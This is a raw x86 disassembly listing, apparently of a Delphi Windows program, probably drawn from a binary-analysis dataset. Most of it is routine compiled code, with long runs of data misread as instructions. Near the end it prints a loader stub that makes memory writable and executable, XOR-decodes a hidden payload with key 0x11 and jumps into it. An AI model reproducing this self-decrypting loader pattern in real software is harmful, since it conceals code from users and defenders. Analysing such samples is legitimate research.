call sub_46a364
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46a6ed
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_46a370
mov ebx eax
test ebx ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404034
mov eax esi
call sub_403fe0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46a728
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_46a370
test eax eax
jne r-xdata
mov eax [ eax ]
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_46a748
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov ebx eax
mov edx ebp
mov eax [ ebx + 0x10 ]
call sub_46a370
mov esi eax
test esi esi
jne r-xdata
mov edi [ esi ]
xor edi edi
jmp r-xdata
mov edx edi
mov eax [ esp ]
call sub_469d74
mov ecx eax
mov edx ebp
mov eax [ ebx + 0x10 ]
call sub_46a4d4
test edi edi
jne r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov eax ebx
call sub_46a7f0
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_469da0
xor ecx ecx
mov edx ebp
mov eax [ ebx + 0x10 ]
call sub_46a4d4
jmp r-xdata
test esi esi
je r-xdata
sub_46a7b0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_46a370
test eax eax
je r-xdata
test esi esi
je r-xdata
mov [ eax ] esi
jmp r-xdata
mov eax ebx
call sub_46a7f0
pop edi
pop esi
pop ebx
retn
mov edx esi
xor eax eax
call sub_469d74
mov ecx eax
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_46a4d4
sub_46a804
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_46a370
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_46a2dc
mov eax ebx
call sub_46a7f0
pop esi
pop ebx
retn
call sub_469da0
sub_46a840
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor edx edx
mov eax edi
call sub_469d74
mov ecx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_46a3dc
mov eax ebx
call sub_46a7f0
pop edi
pop esi
pop ebx
retn
sub_46a89c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
mov [ edi + 0x10 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x14 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_46a8e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4039e4#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414444
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a9d3
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
mov eax [ ebp - 0x4 ]
call sub_4144dc
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jl r-xdata
xor eax eax
push ebp
push j_sub_4039e4#7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414598
retn
inc ebx
mov [ ebp - 0x8 ] ebx
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x24 ]
inc ebx
dec [ ebp - 0x8 ]
jne r-xdata
sub_46a9dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jne r-xdata
test ebx ebx
jle r-xdata
mov [ ecx ] 0xffffffff
mov [ edx ] 0xffffffff
jmp r-xdata
neg ebx
dec ebx
mov [ ecx ] ebx
mov eax [ ebp - 0x4 ]
mov [ edx ] eax
mov esi [ ebp - 0x4 ]
mov [ ecx ] esi
dec ebx
mov [ edx ] ebx
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46aa1c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4039e4#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
or ebx 0xffffffff
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
jmp r-xdata
mov ecx r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aaad
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
sub_46aabb
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx ebx
mov esi [ eax ]
call [ esi + 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x20 ]
xor eax eax
pop esi
pop ebx
pop ebp
retn
sub_46aaf0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jle r-xdata
test ebx ebx
jge r-xdata
mov edx ebx
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x2d8 ]
call sub_46a370
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx r-xdata
mov eax [ eax + 0x10 ]
call sub_46a364
jmp r-xdata
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x24 ]
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_46ab64
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_46aba2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov eax [ ebp - 0x4 ]
call sub_463740
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aba9
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_46abac
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_46a9dc
cmp [ esp ] 0x0
jge r-xdata
push esi
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_46b1c0
mov eax esi
call sub_403fe0
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_46abec
mov edx [ eax + 0x14 ]
test edx edx
jne r-xdata
test edx edx
jle r-xdata
xor eax eax
retn
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x24c ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x21c ]
jmp r-xdata
retn
sub_46ac10
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_46a9dc
cmp [ esp ] 0x0
jge r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ ebx + 0x10 ]
call sub_46b204
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebx
retn
sub_46ac44
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_46ac83
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov eax [ ebp - 0x4 ]
call sub_463740
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ac8a
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_46ac90
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_46a9dc
push esi
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_46b230
pop ecx
pop edx
pop esi
pop ebx
retn
sub_46acc0
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_46a9dc
push esi
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_46b280
pop ecx
pop edx
pop esi
pop ebx
retn
sub_46acfc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_464584
mov eax esi
call sub_46b010
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_46ad44
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
cmp [ esi + 0x2dc ] 0x0
je r-xdata
cmp [ esi + 0x2e0 ] 0x0
je r-xdata
mov edx sub_46ad38
mov eax [ esi + 0x2dc ]
call sub_46a364
mov eax [ esi + 0x2dc ]
call sub_403290
cmp [ esi + 0x2d8 ] 0x0
je r-xdata
mov edx sub_46ad38
mov eax [ esi + 0x2e0 ]
call sub_46a364
mov eax [ esi + 0x2e0 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4646d4
test bl bl
jle r-xdata
mov edx sub_46ad38
mov eax [ esi + 0x2d8 ]
call sub_46a364
mov eax [ esi + 0x2d8 ]
call sub_403290
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_46add8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x70 ]
xor eax eax
pop esi
pop ebx
pop ebp
retn
sub_46adf8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edx sub_46add8
mov eax [ ebx + 0x2d8 ]
call sub_46a364
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_469b74
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46ae30
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x2d8 ]
call sub_46a480
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_469c14
pop edi
pop esi
pop ebx
retn
sub_46ae60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_46b1c0
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_46aea4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4039e4#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46b000
xor eax eax
push ebp
push sub_46af24
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46b1c0
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_4043ec
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46af2b
mov eax [ ebp - 0x4 ]
call sub_46b008
retn
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46b230
sub_46af2b
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_469c64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46af5a
lea eax [ ebp - 0x10 ]
call sub_403fe0
retn
sub_46af64
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039e4#3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x28c ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_469c90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aff7
lea eax [ ebp - 0x14 ]
call sub_403fe0
retn
mov eax [ ebp - 0xc ]
add eax 0x2
push eax
lea eax [ ebp - 0x14 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_46b1c0
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x10 ]
add ecx 0x2
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_41d4d8
sub_46b010
push ebx
push esi
mov esi eax
cmp [ esi + 0x2e0 ] 0x0
jne r-xdata
cmp [ esi + 0x24c ] 0x100
jle r-xdata
cmp [ esi + 0x21c ] 0x200
jle r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
cmp [ esi + 0x2d8 ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a25c
mov [ esi + 0x2dc ] eax
cmp [ esi + 0x2dc ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a25c
mov [ esi + 0x2e0 ] eax
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a25c
mov [ esi + 0x2d8 ] eax
sub_46b0bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x2e4 ] 0x0
jne r-xdata
mov [ ebx + 0x2e5 ] 0x1
mov ecx edi
mov edx esi
mov eax ebx
call sub_466b64
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ ebx + 0x22c ]
jne r-xdata
cmp esi [ ebx + 0x228 ]
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
jne r-xdata
mov eax ebx
call sub_464b64
sub_46b108
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
cmp [ esp ] 0x0
je r-xdata
lea edi [ esi + 0x2dc ]
lea edi [ esi + 0x2e0 ]
jmp r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp ] 0x0
je r-xdata
mov eax [ edi ]
mov edx ebp
call sub_46a370
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ ebp + 0x1 ]
mov eax ebp
neg eax
dec eax
jmp r-xdata
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a89c
mov ebx eax
mov eax [ edi ]
mov ecx ebx
mov edx ebp
call sub_46a4d4
sub_46b16c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax [ ebx + 0x2d8 ]
call sub_46a370
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x200
jle r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a54c
mov esi eax
mov ecx esi
mov edx edi
mov eax [ ebx + 0x2d8 ]
call sub_46a4d4
sub_46b1c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x2d8 ]
call sub_46a370
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax esi
call sub_403fe0
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46b204
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x2d8 ]
call sub_46a370
test eax eax
jne r-xdata
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46b230
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46b16c
mov ecx [ ebp + 0x8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx esi
mov eax ebx
call sub_46b108
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46b108
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_46b0bc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46b280
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46b16c
mov ecx [ ebp + 0x8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
mov cl 0x1
mov edx esi
mov eax ebx
call sub_46b108
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46b108
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_46b0bc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46b2d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b2f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b2fc
retn
sub_46b30c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46b2f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b2fc
retn
inc esi
add [ eax - 0x4c ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dh
mov ch 0x46
add [ eax ] dh
add eax [ eax ]
add [ eax - 0x63ffbac3 ] bh
fwait
inc ecx
add al bl
imul eax [ ebp ] r-xdata
in al dx
xor al 0x40
add al bh
pop [ ebp ]
sub [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add ah dh
imul eax [ ebp ] 0xffffff80
push esp
inc esp
add [ ecx + esi * 2 + 0x45 ] ah
add [ eax ] dh
inc eax
inc ecx
add [ ebp + ebp * 2 + 0x6df00045 ] dh
inc ebp
add ah bh
outsb
inc ebp
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 + 0x77740041 ] dh
inc ebp
add [ eax + ebx * 4 - 0x4cebffbf ] dl
inc ebp
add [ eax + ebp * 2 + 0x45 ] cl
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ esp + esi * 2 + 0x45 ] dl
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ eax + 0x75 ] cl
inc ebp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x3c0043e0 ] ch
ja r-xdata
add al 0x1d
add [ eax ] cl
jbe r-xdata
jne r-xdata
add [ esi ] cl
add [ eax ] bh
mov ch 0x46
add al bh
add al [ eax ]
add [ eax ] al
jl r-xdata
add al ah
loope r-xdata
add [ ecx ] cl
inc edi
jb r-xdata
je r-xdata
outsb
jne r-xdata
insb
xor esp edi
add al [ eax ]
add [ ecx ] al
add [ ebx ] cl
inc ebx
outsd
outsb
je r-xdata
add [ esi ] al
inc edx
jbe r-xdata
add [ eax + 0x70004596 ] ch
pop ebx
inc esp
add al bh
inc ebp
inc esp
add [ ebx + ebp * 4 + 0x61400045 ] bh
inc ebp
add al dh
arpl [ ebp ] ax
pushfd
pushfd
inc ebp
add al bl
insb
inc ebp
add [ ebp + ebp * 2 + 0x45 ] dl
add [ edi + ebp * 4 + 0x6a100045 ] bl
inc ebp
add [ eax - 0x7fffba56 ] ah
xchg ecx eax
inc ebp
add [ esp + ebp * 4 + 0x45 ] dl
add [ eax ] bh
ja r-xdata
inc esp
inc esp
add [ ecx + ecx * 2 + 0x44 ] bh
add [ edi + esi * 2 + 0x4bc0045 ] dh
inc esp
add [ edi + eax * 2 + 0x48580044 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add [ edi + 0x45 ] cl
add [ eax + 0x7e ] bl
inc ebp
add [ eax ] cl
push ds
inc esp
add [ ebx + ecx * 4 ] bl
inc ebp
add [ esi + ecx * 4 + 0x45 ] bh
add [ eax ] bh
lea eax [ ebp ]
mov al [ 0xffffffffa400441e ]
push ds
inc esp
add [ edi + ecx * 4 + 0x1d040045 ] dh
push esp
inc esi
outsd
jne r-xdata
add [ eax ] al
or eax [ eax ]
or [ edi + 0x72 ] eax
outsd
outsb
xor [ eax ] ecx
add eax [ eax ]
add [ eax + eax ] al
pop es
inc edx
imul esi [ edx + eax * 2 + 0x74 ] 0x30c316e
push edx
popad
adc al 0x3
add [ eax ] al
pop es
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ eax ] ebx
add eax [ eax ]
add [ eax ] cl
add [ edi ] al
inc edx
jne r-xdata
outsd
outsd
insb
inc edx
popad
jb r-xdata
add [ ecx - 0x7e7e7e7f ] 0x9c818181
xor [ ebx + esi * 4 + 0x46 ] edx
add [ eax ] al
jb r-xdata
inc edx
outsd
js r-xdata
add eax [ eax ]
jo r-xdata
inc edx
add al ah
salc
inc esp
add ah bh
rol [ eax + eax - 0x18 ] cl
adc eax 0x21a40043
inc ebx
add [ eax + 0x33 ] dh
inc ebx
add [ edx + esi * 2 + 0xd2c0042 ] bl
inc ebx
add ah bh
pushfd
je r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x46540632
outsd
jb r-xdata
outsd
js r-xdata
add [ eax ] al
add eax 0x6f500a00
jo r-xdata
outsb
xor [ ebx + eax ] ecx
add [ ebx ] al
add [ eax ] al
add al [ eax ]
or edx [ ebx + 0x74 ]
jb r-xdata
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0xf9818181
mov dh 0x5f
adc [ ecx ] edx
inc edi
jns r-xdata
movups [ ecx ] xmm2
add [ ecx + 0x4c987781 ] 0x1828f843
or al 0x78
push ecx
out dx al
cmpsb [ esi ] [ edi ]
aad 0x11
adc [ ecx ] edx
stc
push esi
add [ ecx ] edx
adc [ ecx - 0x12 ] eax
sbb eax edi
mov esi 0x8111113f
jpo r-xdata
push ebp
push eax
out dx eax
clc
insd
pop eax
adc [ ecx ] edx
add [ ecx - 0x2edd7e7f ] 0x110f58f8
adc [ ecx - 0x67887e7f ] eax
dec esp
inc ebx
clc
sub [ eax ] bl
push r-xdata
call sub_46b590
add [ ecx + 0x47ee117b ] 0x1a8ef869
adc [ ecx ] edx
add [ ecx - 0x7e7e7e7f ] 0x81818181
pushfd
lea eax [ ebp - 0x8 ]
push eax
sar [ edx + eax * 2 ] 0x1
shl [ 0xffffffffc5880046 ] 0x42
sub [ ebx ] al
add [ eax ] al
or al 0x0
or eax [ ecx + 0x63 ]
je r-xdata
add esp 0xfffffff8
push ebx
push esi
mov ebx [ ebp + 0x8 ]
nop
test ebx ebx
je r-xdata
jne r-xdata
outsb
jne r-xdata
add [ eax - 0x35 ] dl
outsb
xor [ ebx + eax ] ebx
add [ eax ] al
or [ eax ] eax
push 0x40
push 0x5a28
push ebx
call VirtualProtect
xor eax eax
xor [ 0x426df000 ] ecx
add al dl
jl r-xdata
jae r-xdata
imul ebp [ fs : edi + 0x47 ] 0x70756f72
and [ ebx ] al
add [ eax ] al
or al [ eax ]
or edx [ edx + 0x61 ]
add [ eax ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x31786f42
outsb
inc edi
jb r-xdata
xchg ebp eax
xor [ edi ] cl
adc [ ecx ] edx
xchg edx eax
jne r-xdata
inc edi
stc
xchg ebp eax
pop edi
adc [ ecx ] edx
xchg edx eax
aad 0x1d
stc
mov [ 0x2a111150 ] al
salc
push ds
lea esi [ eax + ebx ]
mov dl [ esi ]
xor dl 0x11
mov [ esi ] dl
inc eax
cmp eax 0x5a29
jne r-xdata
add ebx 0x4880
mov [ ebp - 0x4 ] ebx
jmp [ ebp - 0x4 ]
aas
inc ebp
add [ eax + eax ] cl
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x32c31
inc esp
add [ ebx + 0x46b574c0 ] cl
add [ edi ] al
push es
xor [ ebx + eax ] esp
or [ ecx + ebp * 2 + 0x73 ] cl
adc [ ebx ] al
add [ eax ] al
push es
add [ ecx ] cl
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x31756e65
add [ esi ] bl
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add al al
xor eax 0xc5880046
inc edx
in al dx
or eax [ ecx + 0x63 ]
je r-xdata
xor [ ebx + eax ] ebp
add [ eax ] al
or al 0x0
je r-xdata
xor [ fs : ebx + eax ] eax
add [ eax ] al
add eax [ eax ]
or al 0x53
jo r-xdata
insb
test eax 0xeca19c9c
out dx al
out dx al
clc
mov esp 0x81111103
add [ ecx + 0x1137941e ] 0x519a1111
imul edx [ edx + 0x1211ed74 ] 0xd699ad0
0x619a3549 0x9a31
push ecx
or [ edx ] edx
call 0xffffffffe0597ecd
cwde
push esp
jmp 0xffffffff94658856
cmp eax 0x55d74711
xor eax 0x43f91005
push es
adc [ ecx ] edx
dec eax
clc
xchg ecx eax
adc eax 0x949c1111
dec ebp
in al dx
out dx al
out dx al
inc ecx
and ah bh
inc edi
out dx al
inc esi
pop ebp
xchg esp eax
rcr [ esi ] 0x1
xchg ebp eax
